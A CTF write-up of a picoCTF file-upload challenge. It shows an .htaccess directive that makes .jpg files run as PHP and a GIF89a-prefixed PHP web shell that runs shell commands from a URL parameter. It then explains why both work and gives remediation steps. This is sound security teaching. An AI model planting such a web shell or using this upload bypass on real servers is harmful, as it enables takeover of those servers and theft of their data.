
---

# CTF Write-up: byp4ss3d (picoCTF)

**Objective:** Bypass file upload restrictions to achieve Remote Code Execution (RCE) and retrieve the flag.

**Flag:** `picoCTF{s3rv3r_byp4ss_0c257942}`

## 1. The Attack Chain

The challenge presented a file upload vulnerability where standard executable file extensions (like `.php`) were likely blocked or filtered. The exploitation required a two-step bypass: reconfiguring the server and obfuscating the payload.

### Step 1: Modifying Server Behavior via `.htaccess`

To trick the server into executing a non-standard extension, an `.htaccess` file was uploaded with the following directive:

Apache

```
AddType application/x-httpd-php .jpg
```

This configuration tells the Apache web server to map the `.jpg` extension to the PHP handler. Any `.jpg` file accessed in this directory will now be parsed and executed as PHP code.

### Step 2: Payload Obfuscation (Magic Bytes Bypass)

With the server prepared to execute `.jpg` files as PHP, the next hurdle was bypassing the application's file content validation. The application was likely checking the file signature (magic bytes) to ensure only valid images were uploaded.

A malicious polyglot file was created and uploaded:

PHP

```
GIF89a<?php system($_GET["cmd"]); ?>
```

By prepending the `GIF89a` magic bytes, the file masquerades as a legitimate GIF image to the upload filter. The rest of the file contains a basic PHP web shell.

### Step 3: Execution and Privilege Escalation

Once both files were successfully uploaded, the fake image file was requested via the browser. By appending a command to the URL parameter `?cmd=`, the server executed the PHP code.

Running the command `cat /var/www/flag.txt` successfully read the restricted file and revealed the flag.

---

## 2. Lessons Learned: How It Works

### The `.htaccess` Misconfiguration

Apache web servers use `.htaccess` files to allow directory-level configuration overrides. When `AllowOverride` is enabled in the main Apache config, users can dictate how the server behaves in that specific directory. By allowing an attacker to upload an `.htaccess` file, the application surrenders control of its execution environment, rendering any previous extension blacklists useless.

### The "Magic Bytes" Illusion

Many applications attempt to secure file uploads by checking the file's MIME type or using functions like `getimagesize()` (in PHP) or `file` (in Linux). These functions often only inspect the first few bytes of a file—known as the "magic number" or file signature. Because the payload started with `GIF89a`, the server's validation logic was fooled into categorizing the dangerous script as a benign image.

### The Web Shell Execution

Because the `.htaccess` file successfully told the server to parse `.jpg` files as PHP, the server ignores the `GIF89a` text (treating it as raw HTML output) and immediately executes the text enclosed in the `<?php ... ?>` tags. The `system()` function then passes the supplied GET parameter directly to the underlying operating system shell, resulting in RCE.

## 3. Remediation & Defensive Strategies

If you were defending this application, these are the steps required to patch the vulnerability:

1. **Disable `.htaccess` Overrides:** In the main Apache configuration (`httpd.conf` or `apache2.conf`), set `AllowOverride None` for the upload directory. This prevents uploaded files from altering server behavior.
    
2. **Store Uploads Outside the Web Root:** Uploaded files should never be stored in a directory that is directly accessible via a URL. Serve them via a script that checks permissions and forces a download, rather than allowing direct execution.
    
3. **Strict Extension Whitelisting:** Instead of blacklisting bad extensions (like `.php`), only allow specific, safe extensions (`.jpg`, `.png`).
    
4. **Strip Exif/Metadata:** Pass uploaded images through an image processing library (like GD or ImageMagick) to re-encode them. This strips out any injected PHP code embedded within the image data or structure.
    

---
